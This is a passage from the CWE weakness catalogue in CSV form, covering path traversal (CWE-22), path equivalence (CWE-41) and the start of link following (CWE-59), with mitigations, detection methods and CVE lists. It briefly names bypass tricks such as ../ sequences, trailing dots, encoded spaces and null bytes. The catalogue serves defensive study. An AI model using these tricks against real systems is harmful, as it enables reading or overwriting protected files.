or overwrite critical files that are used to execute code, such as programs or libraries.::SCOPE:Integrity:IMPACT:Modify Files or Directories:NOTE:The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.::SCOPE:Confidentiality:IMPACT:Read Files or Directories:NOTE:The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of protection mechanisms such as authentication, it has the potential to lock out product users.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated techniques can find areas where path traversal weaknesses exist. However, tuning or customization may be required to remove or de-prioritize path-traversal problems that are only exploitable by the product's administrator - or other privileged users - and thus potentially valid behavior or, at worst, a bug instead of a vulnerability.:EFFECTIVENESS:High::METHOD:Manual Static Analysis:DESCRIPTION:Manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all file access operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Cost effective for partial coverage: Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked. Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59). This includes: realpath() in C getCanonicalPath() in Java GetFullPath() in ASP.NET realpath() or abs_path() in Perl realpath() in PHP::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design Operation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2024-37032:DESCRIPTION:Large language model (LLM) management tool does not validate the format of a digest value (CWE-1287) from a private, untrusted model registry, enabling relative path traversal (CWE-23), a.k.a. Probllama:LINK:https://www.cve.org/CVERecord?id=CVE-2024-37032::REFERENCE:CVE-2024-4315:DESCRIPTION:Chain: API for text generation using Large Language Models (LLMs) does not include the Windows folder separator in its denylist (CWE-184) when attempting to prevent Local File Inclusion via path traversal (CWE-22), allowing deletion of arbitrary files on Windows systems.:LINK:https://www.cve.org/CVERecord?id=CVE-2024-4315::REFERENCE:CVE-2022-45918:DESCRIPTION:Chain: a learning management tool debugger uses external input to locate previous session logs (CWE-73) and does not properly validate the given path (CWE-20), allowing for filesystem path traversal using ../ sequences (CWE-24):LINK:https://www.cve.org/CVERecord?id=CVE-2022-45918::REFERENCE:CVE-2019-20916:DESCRIPTION:Python package manager does not correctly restrict the filename specified in a Content-Disposition header, allowing arbitrary file read using path traversal sequences such as ../:LINK:https://www.cve.org/CVERecord?id=CVE-2019-20916::REFERENCE:CVE-2022-31503:DESCRIPTION:Python package constructs filenames using an unsafe os.path.join call on untrusted input, allowing absolute path traversal because os.path.join resets the pathname to an absolute path that is specified as part of the input.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-31503::REFERENCE:CVE-2022-24877:DESCRIPTION:directory traversal in Go-based Kubernetes operator app allows accessing data from the controller's pod file system via ../ sequences in a yaml file:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24877::REFERENCE:CVE-2021-21972:DESCRIPTION:Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21972::REFERENCE:CVE-2020-4053:DESCRIPTION:a Kubernetes package manager written in Go allows malicious plugins to inject path traversal sequences into a plugin archive (Zip slip) to copy a file outside the intended directory:LINK:https://www.cve.org/CVERecord?id=CVE-2020-4053::REFERENCE:CVE-2020-3452:DESCRIPTION:Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3452::REFERENCE:CVE-2019-10743:DESCRIPTION:Go-based archive library allows extraction of files to locations outside of the target folder with ../ path traversal sequences in filenames in a zip file, aka Zip Slip:LINK:https://www.cve.org/CVERecord?id=CVE-2019-10743::REFERENCE:CVE-2010-0467:DESCRIPTION:Newsletter module allows reading arbitrary files using ../ sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0467::REFERENCE:CVE-2006-7079:DESCRIPTION:Chain: PHP app uses extract for register_globals compatibility layer (CWE-621), enabling path traversal (CWE-22):LINK:https://www.cve.org/CVERecord?id=CVE-2006-7079::REFERENCE:CVE-2009-4194:DESCRIPTION:FTP server allows deletion of arbitrary files using .. in the DELE command.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4194::REFERENCE:CVE-2009-4053:DESCRIPTION:FTP server allows creation of arbitrary directories using .. in the MKD command.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4053::REFERENCE:CVE-2009-0244:DESCRIPTION:FTP service for a Bluetooth device allows listing of directories, and creation or reading of files using .. sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0244::REFERENCE:CVE-2009-4013:DESCRIPTION:Software package maintenance program allows overwriting arbitrary files using ../ sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4013::REFERENCE:CVE-2009-4449:DESCRIPTION:Bulletin board allows attackers to determine the existence of files using the avatar.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4449::REFERENCE:CVE-2009-4581:DESCRIPTION:PHP program allows arbitrary code execution using .. in filenames that are fed to the include() function.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4581::REFERENCE:CVE-2010-0012:DESCRIPTION:Overwrite of files using a .. in a Torrent file.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0012::REFERENCE:CVE-2010-0013:DESCRIPTION:Chat program allows overwriting files using a custom smiley request.:LINK:https://www.cve.org/CVERecord?id=CVE-2010-0013::REFERENCE:CVE-2008-5748:DESCRIPTION:Chain: external control of values for user's desired language and theme enables path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5748::REFERENCE:CVE-2009-1936:DESCRIPTION:Chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1936::\",::File Processing::,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Path Traversal::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A4:ENTRY NAME:Insecure Direct Object Reference:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A2:ENTRY NAME:Broken Access Control:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO02-C:ENTRY NAME:Canonicalize path names originating from untrusted sources::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:IDS00-PL:ENTRY NAME:Canonicalize path names before validating them:MAPPING FIT:Exact::TAXONOMY NAME:WASC:ENTRY ID:33:ENTRY NAME:Path Traversal::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP16:ENTRY NAME:Path Traversal::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-22::\",::126::64::76::78::79::,\"::TYPE:Other:NOTE:In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to apply to a wider range of files. For example, the product may add .txt to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.::TYPE:Relationship:NOTE:Pathname equivalence can be regarded as a type of canonicalization error.::TYPE:Relationship:NOTE:Some pathname equivalence issues are not directly related to directory traversal, rather are used to bypass security-relevant checks for whether a file/directory can be accessed by the attacker (e.g. a trailing / on a filename could bypass access rules that don't expect a trailing /, causing a server to provide the file when it normally would not).::TYPE:Terminology:NOTE:Like other weaknesses, terminology is often based on the types of manipulations used, instead of the underlying weaknesses. Some people use directory traversal only to refer to the injection of .. and equivalent sequences whose specific meaning is to traverse directories. Other variants like absolute pathname and drive letter have the *effect* of directory traversal, but some people may not call it such, since it doesn't involve .. or equivalent.::TYPE:Research Gap:NOTE:Many variants of path traversal attacks are probably under-studied with respect to root cause. CWE-790 and CWE-182 begin to cover part of this gap.::TYPE:Research Gap:NOTE:Incomplete diagnosis or reporting of vulnerabilities can make it difficult to know which variant is affected. For example, a researcher might say that .. is vulnerable, but not test ../ which may also be vulnerable. Any combination of directory separators (/, , etc.) and numbers of . (e.g. ....) can produce unique variants; for example, the //../ variant is not listed (CVE-2004-0325). See this entry's children and lower-level descendants.::\",\n41,\"Improper Resolution of Path Equivalence\",Base,Incomplete,\"The product is vulnerable to file system contents disclosure through path equivalence. Path equivalence involves the use of special characters in file and directory names. The associated manipulations are intended to generate multiple names for the same object.\",\"Path equivalence is usually employed in order to circumvent access controls expressed using an incomplete set of file name or file path representations. This is different from path traversal, wherein the manipulations are performed to generate a name for a different object.\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Bypass Protection Mechanism:NOTE:An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism than an attacker may be able to bypass the mechanism.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::\",\"::REFERENCE:CVE-2000-1114:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1114::REFERENCE:CVE-2002-1986:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1986::REFERENCE:CVE-2004-2213:DESCRIPTION:Source code disclosure using trailing dot or trailing encoding space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2213::REFERENCE:CVE-2005-3293:DESCRIPTION:Source code disclosure using trailing dot:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3293::REFERENCE:CVE-2004-0061:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0061::REFERENCE:CVE-2000-1133:DESCRIPTION:Bypass directory access restrictions using trailing dot in URL:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1133::REFERENCE:CVE-2001-1386:DESCRIPTION:Bypass check for .lnk extension using .lnk.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1386::REFERENCE:CVE-2001-0693:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0693::REFERENCE:CVE-2001-0778:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0778::REFERENCE:CVE-2001-1248:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1248::REFERENCE:CVE-2004-0280:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0280::REFERENCE:CVE-2005-0622:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0622::REFERENCE:CVE-2005-1656:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1656::REFERENCE:CVE-2002-1603:DESCRIPTION:Source disclosure via trailing encoded space %20:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1603::REFERENCE:CVE-2001-0054:DESCRIPTION:Multi-Factor Vulnerability (MFV). directory traversal and other issues in FTP server using Web encodings such as %20; certain manipulations have unusual side effects.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0054::REFERENCE:CVE-2002-1451:DESCRIPTION:Trailing space (+ in query string) leads to source code disclosure.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1451::REFERENCE:CVE-2000-0293:DESCRIPTION:Filenames with spaces allow arbitrary file deletion when the product does not properly quote them; some overlap with path traversal.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0293::REFERENCE:CVE-2001-1567:DESCRIPTION:+ characters in query string converted to spaces before sensitive file/extension (internal space), leading to bypass of access restrictions to the file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1567::REFERENCE:CVE-2002-0253:DESCRIPTION:Overlaps infoleak:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0253::REFERENCE:CVE-2001-0446:DESCRIPTION:Application server allows remote attackers to read source code for .jsp files by appending a / to the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0446::REFERENCE:CVE-2004-0334:DESCRIPTION:Bypass Basic Authentication for files using trailing /:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0334::REFERENCE:CVE-2001-0893:DESCRIPTION:Read sensitive files with trailing /:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0893::REFERENCE:CVE-2001-0892:DESCRIPTION:Web server allows remote attackers to view sensitive files under the document root (such as .htpasswd) via a GET request with a trailing /.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0892::REFERENCE:CVE-2004-1814:DESCRIPTION:Directory traversal vulnerability in server allows remote attackers to read protected files via .. (dot dot) sequences in an HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1814::REFERENCE:CVE-2002-1483:DESCRIPTION:Read files with full pathname using multiple internal slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1483::REFERENCE:CVE-1999-1456:DESCRIPTION:Server allows remote attackers to read arbitrary files via a GET request with more than one leading / (slash) character in the filename.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1456::REFERENCE:CVE-2004-0578:DESCRIPTION:Server allows remote attackers to read arbitrary files via leading slash (//) characters in a URL request.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0578::REFERENCE:CVE-2002-0275:DESCRIPTION:Server allows remote attackers to bypass authentication and read restricted files via an extra / (slash) in the requested URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0275::REFERENCE:CVE-2004-1032:DESCRIPTION:Product allows local users to delete arbitrary files or create arbitrary empty files via a target filename with a large number of leading slash (/) characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1032::REFERENCE:CVE-2002-1238:DESCRIPTION:Server allows remote attackers to bypass access restrictions for files via an HTTP request with a sequence of multiple / (slash) characters such as http://www.example.com///file/.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1238::REFERENCE:CVE-2004-1878:DESCRIPTION:Product allows remote attackers to bypass authentication, obtain sensitive information, or gain access via a direct request to admin/user.pl preceded by // (double leading slash).:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1878::REFERENCE:CVE-2005-1365:DESCRIPTION:Server allows remote attackers to execute arbitrary commands via a URL with multiple leading / (slash) characters and .. sequences.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1365::REFERENCE:CVE-2000-1050:DESCRIPTION:Access directory using multiple leading slash.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1050::REFERENCE:CVE-2001-1072:DESCRIPTION:Bypass access restrictions via multiple leading slash, which causes a regular expression to fail.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1072::REFERENCE:CVE-2004-0235:DESCRIPTION:Archive extracts to arbitrary files using multiple leading slash in filenames in the archive.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0235::REFERENCE:CVE-2002-1078:DESCRIPTION:Directory listings in web server using multiple trailing slash:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1078::REFERENCE:CVE-2004-0847:DESCRIPTION:ASP.NET allows remote attackers to bypass authentication for .aspx files in restricted directories via a request containing a (1) (backslash) or (2) %5C (encoded backslash), aka Path Validation Vulnerability.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0847::REFERENCE:CVE-2000-0004:DESCRIPTION:Server allows remote attackers to read source code for executable files by inserting a . (dot) into the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0004::REFERENCE:CVE-2002-0304:DESCRIPTION:Server allows remote attackers to read password-protected files via a /./ in the HTTP request.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0304::REFERENCE:CVE-1999-1083:DESCRIPTION:Possibly (could be a cleansing error):LINK:https://www.cve.org/CVERecord?id=CVE-1999-1083::REFERENCE:CVE-2004-0815:DESCRIPTION:/./////etc cleansed to .///etc then /etc:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0815::REFERENCE:CVE-2002-0112:DESCRIPTION:Server allows remote attackers to view password protected files via /./ in the URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0112::REFERENCE:CVE-2004-0696:DESCRIPTION:List directories using desired path and *:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0696::REFERENCE:CVE-2002-0433:DESCRIPTION:List files in web server using *.ext:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0433::REFERENCE:CVE-2001-1152:DESCRIPTION:Proxy allows remote attackers to bypass denylist restrictions and connect to unauthorized web servers by modifying the requested URL, including (1) a // (double slash), (2) a /SUBDIR/.. where the desired file is in the parentdir, (3) a /./, or (4) URL-encoded characters.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1152::REFERENCE:CVE-2000-0191:DESCRIPTION:application check access for restricted URL before canonicalization:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0191::REFERENCE:CVE-2005-1366:DESCRIPTION:CGI source disclosure using dirname/../cgi-bin:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1366::REFERENCE:CVE-1999-0012:DESCRIPTION:Multiple web servers allow restriction bypass using 8.3 names instead of long names:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0012::REFERENCE:CVE-2001-0795:DESCRIPTION:Source code disclosure using 8.3 file name.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0795::REFERENCE:CVE-2005-0471:DESCRIPTION:Multi-Factor Vulnerability. Product generates temporary filenames using long filenames, which become predictable in 8.3 format.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0471::\",,::File or Directory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Path Equivalence::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO02-C:ENTRY NAME:Canonicalize path names originating from untrusted sources::\",::3::,\"::TYPE:Relationship:NOTE:Some of these manipulations could be effective in path traversal issues, too.::\",\n59,\"Improper Link Resolution Before File Access ('Link Following')\",Base,Draft,\"The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource.\",\"\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:706:VIEW ID:1003:ORDINAL:Primary::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Windows:OPERATING SYSTEM PREVALENCE:Sometimes::OPERATING SYSTEM CLASS:Unix:OPERATING SYSTEM PREVALENCE:Often::,\"::Soft links are a UNIX term that is synonymous with simple shortcuts on Windows-based platforms.::\",\"::TERM:insecure temporary file:DESCRIPTION:Some people use the phrase insecure temporary file when referring to a link following weakness, but other weaknesses can produce insecure temporary files without any symlink involvement at all.::TERM:Zip Slip:DESCRIPTION:Zip slip is an attack that uses file archives (e.g., ZIP, tar, rar, etc.) that contain filenames with path traversal sequences that cause the files to be written outside of the directory under which the archive is expected to be extracted [REF-1282]. It is most commonly used for relative path traversal (CWE-23) and link following (CWE-59).::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Bypass Protection Mechanism:NOTE:An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism.::SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:NOTE:Windows simple shortcuts, sometimes referred to as soft links, can be exploited remotely since a .LNK file can be uploaded like a normal file. This can enable remote execution.::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for 